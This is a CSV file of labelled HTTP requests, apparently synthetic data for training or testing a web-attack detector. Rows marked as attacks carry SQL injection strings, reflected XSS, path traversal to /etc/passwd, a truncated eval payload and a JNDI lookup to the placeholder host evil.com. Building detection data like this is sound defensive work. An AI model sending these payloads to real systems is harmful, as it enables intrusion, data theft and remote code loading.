request_method,url,payload,user_agent,response_code,is_attack
GET,/app/page19,,Mozilla/5.0 (compatible; Baiduspider/2.0),500,0
GET,/app/page65,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page71,,Nikto/2.1.6,500,0
GET,/app/page70,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page90,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page77?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page32,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page75,,sqlmap/1.0,200,0
GET,/app/page86,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
PUT,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page18,,Nikto/2.1.6,404,0
DELETE,/app/page93?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page78,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page57?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page72,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page17,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page40?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page1,,Nikto/2.1.6,500,0
GET,/app/page82?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page80,,Nikto/2.1.6,404,0
GET,/app/page56?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Nikto/2.1.6,403,1
PUT,/app/page50,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page84,,sqlmap/1.0,200,0
POST,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page6,,Nikto/2.1.6,200,0
POST,/app/page66?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
PUT,/app/page37,,Nikto/2.1.6,200,0
GET,/app/page87,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page17,,Nikto/2.1.6,200,0
GET,/app/page64,,Nikto/2.1.6,200,0
GET,/app/page29?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (compatible; Baiduspider/2.0),404,1
PUT,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page14,,sqlmap/1.0,500,0
PUT,/app/page83,,sqlmap/1.0,404,0
POST,/app/page72,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page56?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page8?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page76?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
DELETE,/app/page2,,Nikto/2.1.6,200,0
PUT,/app/page97,,sqlmap/1.0,500,0
OPTIONS,/app/page65,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page72,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page77,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page79,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page99,,Nikto/2.1.6,500,0
POST,/app/page14,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page7,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page79,,sqlmap/1.0,404,0
GET,/app/page81?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page73,,Mozilla/5.0 (compatible; Baiduspider/2.0),403,0
GET,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page23?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page35?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page15?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page59?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page86,,sqlmap/1.0,200,0
GET,/app/page78,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page56?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page88,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page54,,Mozilla/5.0 (compatible; Baiduspider/2.0),500,0
GET,/app/page32,,sqlmap/1.0,200,0
GET,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page28?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page66,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page51,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page40,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page13?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page43,,sqlmap/1.0,403,0
GET,/app/page50,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page69,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
POST,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page94,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page33?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,500,1
GET,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page65,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page99,,sqlmap/1.0,200,0
GET,/app/page65?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page19?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page41?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page98,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page75,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page45?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),404,1
GET,/app/page12,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page81,,sqlmap/1.0,200,0
POST,/app/page6?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page11,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page36?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page67,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page51,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
DELETE,/app/page9,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
PUT,/app/page24,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page54,,Nikto/2.1.6,200,0
POST,/app/page60?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page94,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page25,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page38,,sqlmap/1.0,403,0
POST,/app/page98?<script>alert('xss')</script>,<script>alert('xss')</script>,Nikto/2.1.6,403,1
GET,/app/page84,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page26,,sqlmap/1.0,200,0
GET,/app/page19?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (compatible; Baiduspider/2.0),500,1
GET,/app/page28,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page97?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page14,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page35,,sqlmap/1.0,200,0
PUT,/app/page35,,Nikto/2.1.6,200,0
GET,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page98,,sqlmap/1.0,200,0
GET,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page40,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page68,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page79?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page94,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page4?' OR 1=1 --,' OR 1=1 --,Nikto/2.1.6,500,1
OPTIONS,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page39,,Nikto/2.1.6,500,0
GET,/app/page56,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page41,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page39,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page29,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page73,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page33,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page46,,Nikto/2.1.6,200,0
GET,/app/page81,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page97?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page58,,Nikto/2.1.6,404,0
GET,/app/page51?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page98?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page54,,sqlmap/1.0,200,0
GET,/app/page55?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page9,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page6?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
POST,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page60?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,403,1
GET,/app/page18?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page84,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page9,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page62?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page33?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page79?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page38?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
DELETE,/app/page46?UNION SELECT * FROM users,UNION SELECT * FROM users,Nikto/2.1.6,500,1
GET,/app/page17?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page94,,sqlmap/1.0,200,0
GET,/app/page6?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page36,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page50,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page47,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page9,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page36,,Mozilla/5.0 (compatible; Baiduspider/2.0),500,0
GET,/app/page90,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page79,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page54?' OR 1=1 --,' OR 1=1 --,sqlmap/1.0,403,1
GET,/app/page57?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page89,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page7?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page90,,Nikto/2.1.6,404,0
GET,/app/page77?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page71,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page39?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page86,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page45,,sqlmap/1.0,200,0
GET,/app/page66,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page50?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page34,,sqlmap/1.0,200,0
GET,/app/page50,,Nikto/2.1.6,200,0
DELETE,/app/page4,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page61,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page27,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page13?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,403,1
POST,/app/page97,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page44,,Nikto/2.1.6,200,0
GET,/app/page42,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page30,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page46,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page19?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page59,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page77,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page9?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,403,1
PUT,/app/page74,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page75,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page60,,sqlmap/1.0,200,0
POST,/app/page11?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (compatible; Baiduspider/2.0),403,1
GET,/app/page80,,sqlmap/1.0,200,0
POST,/app/page35,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page95,,sqlmap/1.0,200,0
GET,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page25,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page14,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page16,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page52,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page69,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page2,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
PUT,/app/page75,,sqlmap/1.0,200,0
POST,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page76?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page18,,sqlmap/1.0,200,0
GET,/app/page80,,Mozilla/5.0 (compatible; Baiduspider/2.0),403,0
POST,/app/page3?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page44?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,403,1
PUT,/app/page30,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page74,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page41,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page41,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page75?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
PUT,/app/page44?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page16?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page35?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (compatible; Baiduspider/2.0),404,1
PUT,/app/page55,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page2?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
POST,/app/page9,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page50,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page62?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
PUT,/app/page69,,sqlmap/1.0,200,0
GET,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page58,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page81,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page52?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page64,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page91,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page72?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page79,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
OPTIONS,/app/page20,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page21,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page47,,Nikto/2.1.6,200,0
GET,/app/page67?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page7?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page12,,sqlmap/1.0,500,0
GET,/app/page84,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page61,,sqlmap/1.0,200,0
GET,/app/page65,,sqlmap/1.0,200,0
POST,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page36,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page71,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page25?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page68,,Mozilla/5.0 (compatible; Baiduspider/2.0),403,0
POST,/app/page34?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page35,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page36?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
DELETE,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page24,,sqlmap/1.0,200,0
GET,/app/page67,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page10,,Nikto/2.1.6,403,0
GET,/app/page24,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page20,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page87?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,403,1
POST,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page16,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page79?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page48?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page86?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page88,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page95?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page73,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page83?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page62,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page70,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page46?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page16?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
POST,/app/page27,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page72,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page86?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page83,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page91,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page81,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page32?' OR 1=1 --,' OR 1=1 --,Nikto/2.1.6,403,1
GET,/app/page30,,sqlmap/1.0,500,0
GET,/app/page54,,Nikto/2.1.6,200,0
POST,/app/page71,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page79?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page20?<script>alert('xss')</script>,<script>alert('xss')</script>,Nikto/2.1.6,500,1
GET,/app/page79,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page43,,Nikto/2.1.6,200,0
POST,/app/page7,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page2?' OR 1=1 --,' OR 1=1 --,sqlmap/1.0,500,1
GET,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page40,,Mozilla/5.0 (compatible; Baiduspider/2.0),500,0
POST,/app/page15,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page55?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page29,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
DELETE,/app/page67,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
